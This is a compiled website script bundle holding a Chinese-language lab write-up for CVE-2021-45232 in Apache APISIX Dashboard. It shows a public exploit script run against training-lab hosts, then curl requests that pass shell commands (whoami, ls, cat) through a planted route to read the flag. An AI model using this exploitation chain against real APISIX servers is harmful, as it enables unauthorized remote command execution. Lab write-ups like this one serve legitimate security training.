"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[10397],{7534:(e,r,n)=>{n.r(r),n.d(r,{assets:()=>d,contentTitle:()=>c,default:()=>l,frontMatter:()=>i,metadata:()=>t,toc:()=>s});const t=JSON.parse('{"id":"Independent-Environment/CVE/CVE-2021-45232/index","title":"CVE-2021-45232","description":"\u9776\u6807\u4ecb\u7ecd\uff1a","source":"@site/docs/Independent-Environment/CVE/CVE-2021-45232/index.md","sourceDirName":"Independent-Environment/CVE/CVE-2021-45232","slug":"/Independent-Environment/CVE/CVE-2021-45232/","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CVE/CVE-2021-45232/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Independent-Environment/CVE/CVE-2021-45232/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Independent_Environment_Sidebar","previous":{"title":"CVE-2021-44665","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CVE/CVE-2021-44665/"},"next":{"title":"CVE-2021-46203","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CVE/CVE-2021-46203/"}}');var o=n(74848),a=n(28453);const i={},c="CVE-2021-45232",d={},s=[{value:"\u5165\u53e3\u70b9",id:"\u5165\u53e3\u70b9",level:2}];function x(e){const r={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",li:"li",p:"p",pre:"pre",ul:"ul",...(0,a.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(r.header,{children:(0,o.jsx)(r.h1,{id:"cve-2021-45232",children:"CVE-2021-45232"})}),"\n",(0,o.jsxs)(r.admonition,{type:"info",children:[(0,o.jsx)(r.p,{children:"\u9776\u6807\u4ecb\u7ecd\uff1a"}),(0,o.jsxs)(r.blockquote,{children:["\n",(0,o.jsx)(r.p,{children:"Apache APISIX Dashboard 2.10.1\u7248\u672c\u524d\u5b58\u5728\u4e24\u4e2aAPI/apisix/admin/migrate/export\u548c/apisix/admin/migrate/import\uff0c\u4ed6\u4eec\u6ca1\u6709\u7ecf\u8fc7droplet\u6846\u67b6\u7684\u6743\u9650\u9a8c\u8bc1\uff0c\u5bfc\u81f4\u672a\u6388\u6743\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5bfc\u51fa\u3001\u5bfc\u5165\u5f53\u524d\u7f51\u5173\u7684\u6240\u6709\u914d\u7f6e\u9879\uff0c\u5305\u62ec\u8def\u7531\u3001\u670d\u52a1\u3001\u811a\u672c\u7b49\u3002\u653b\u51fb\u8005\u901a\u8fc7\u5bfc\u5165\u6076\u610f\u8def\u7531\uff0c\u53ef\u4ee5\u7528\u6765\u8ba9Apache APISIX\u8bbf\u95ee\u4efb\u610f\u7f51\u7ad9\uff0c\u751a\u81f3\u6267\u884cLUA\u811a\u672c"}),"\n",(0,o.jsxs)(r.ul,{children:["\n",(0,o.jsx)(r.li,{children:"CVE"}),"\n"]}),"\n"]})]}),"\n",(0,o.jsx)(r.h2,{id:"\u5165\u53e3\u70b9",children:"\u5165\u53e3\u70b9"}),"\n",(0,o.jsx)(r.pre,{children:(0,o.jsx)(r.code,{className:"language-plaintext",children:"http://d2be512c-64d8-4116-818e-c84717dd4876-488.cyberstrikelab.com:83\nhttp://6debfd48-6e5b-4980-9ef5-22d8aacaa18a-488.cyberstrikelab.com:83\n"})}),"\n",(0,o.jsxs)(r.p,{children:["\u76f4\u63a5\u4f7f\u7528 ",(0,o.jsx)(r.a,{href:"https://github.com/wuppp/cve-2021-45232-exp",children:"wuppp/cve-2021-45232-exp"})," \u8fdb\u884c\u5229\u7528"]}),"\n",(0,o.jsx)(r.pre,{children:(0,o.jsx)(r.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark\u327fkali)-[~/exploit/cve-2021-45232-exp]\n\u2514\u2500$ python3 apisix_dashboard_rce.py http://d2be512c-64d8-4116-818e-c84717dd4876-488.cyberstrikelab.com:83\nattack success\nuri is: /LoEyH0\n"})}),"\n",(0,o.jsx)(r.p,{children:"\u5207\u6362\u5230\u53e6\u4e00\u4e2a\u5165\u53e3\u8fdb\u884c\u4ea4\u4e92"}),"\n",(0,o.jsx)(r.pre,{children:(0,o.jsx)(r.code,{className:"language-shell",children:'\u250c\u2500\u2500(randark\u327fkali)-[~/exploit/cve-2021-45232-exp]\n\u2514\u2500$ curl http://6debfd48-6e5b-4980-9ef5-22d8aacaa18a-488.cyberstrikelab.com:83/LoEyH0 -H "cmd: whoami"\nnobody\n\n\n\u250c\u2500\u2500(randark\u327fkali)-[~/exploit/cve-2021-45232-exp]\n\u2514\u2500$ curl http://6debfd48-6e5b-4980-9ef5-22d8aacaa18a-488.cyberstrikelab.com:83/LoEyH0 -H "cmd: ls -lh /"\ntotal 16K\n-rw-r--r--    1 root root 12K Nov 13  2020 anaconda-post.log\nlrwxrwxrwx    1 root root   7 Nov 13  2020 bin -> usr/bin\ndrwxr-xr-x    5 root root 360 Oct 30 12:13 dev\ndrwxr-xr-x    1 root root  86 Oct 30 12:13 etc\ndrwxr-xr-x    2 root root  10 Apr 11  2018 home\nlrwxrwxrwx    1 root root   7 Nov 13  2020 lib -> usr/lib\nlrwxrwxrwx    1 root root   9 Nov 13  2020 lib64 -> usr/lib64\ndrwxr-xr-x    2 root root  10 Apr 11  2018 media\ndrwxr-xr-x    2 root root  10 Apr 11  2018 mnt\ndrwxr-xr-x    2 root root  10 Apr 11  2018 opt\ndr-xr-xr-x 9785 root root   0 Oct 30 12:13 proc\ndr-xr-x---    1 root root  26 Sep  3  2021 root\ndrwxr-xr-x    1 root root  29 Oct 30 12:13 run\n-rwxr-xr-x    1 root root 264 Nov 28  2024 run.sh\nlrwxrwxrwx    1 root root   8 Nov 13  2020 sbin -> usr/sbin\ndrwxr-xr-x    2 root root  10 Apr 11  2018 srv\ndr-xr-xr-x   13 root root   0 Oct 30 12:13 sys\ndrwxrwxrwt    1 root root  56 Oct 30 12:13 tmp\ndrwxr-xr-x    1 root root  27 Nov 13  2020 usr\ndrwxr-xr-x    1 root root  72 Nov 13  2020 var\n\n\n\u250c\u2500\u2500(randark\u327fkali)-[~/exploit/cve-2021-45232-exp]\n\u2514\u2500$ curl http://6debfd48-6e5b-4980-9ef5-22d8aacaa18a-488.cyberstrikelab.com:83/LoEyH0 -H "cmd: cat /run.sh"\n#!/bin/bash\n\n# \u8f93\u51fa\u73af\u5883\u53d8\u91cf $flag \u7684\u5185\u5bb9\u5230 /tmp/flag.txt\necho $flag > /tmp/flag.txt\n\n# \u521d\u59cb\u5316 APISIX \u548c\u542f\u52a8\u670d\u52a1\nsh -c "/usr/bin/apisix init && /usr/bin/apisix init_etcd && /usr/local/openresty/bin/openresty -p /usr/local/apisix -g \'daemon off;\'"\n\n\n\u250c\u2500\u2500(randark\u327fkali)-[~/exploit/cve-2021-45232-exp]\n\u2514\u2500$ curl http://6debfd48-6e5b-4980-9ef5-22d8aacaa18a-488.cyberstrikelab.com:83/LoEyH0 -H "cmd: cat /tmp/flag.txt"\ngo-flag{bac9cfa0-aa91-4094-a625-8efa8f438560}\n'})})]})}function l(e={}){const{wrapper:r}={...(0,a.R)(),...e.components};return r?(0,o.jsx)(r,{...e,children:(0,o.jsx)(x,{...e})}):x(e)}},28453:(e,r,n)=>{n.d(r,{R:()=>i,x:()=>c});var t=n(96540);const o={},a=t.createContext(o);function i(e){const r=t.useContext(a);return t.useMemo((function(){return"function"==typeof e?e(r):{...r,...e}}),[r,e])}function c(e){let r;return r=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:i(e.components),t.createElement(a.Provider,{value:r},e.children)}}}]);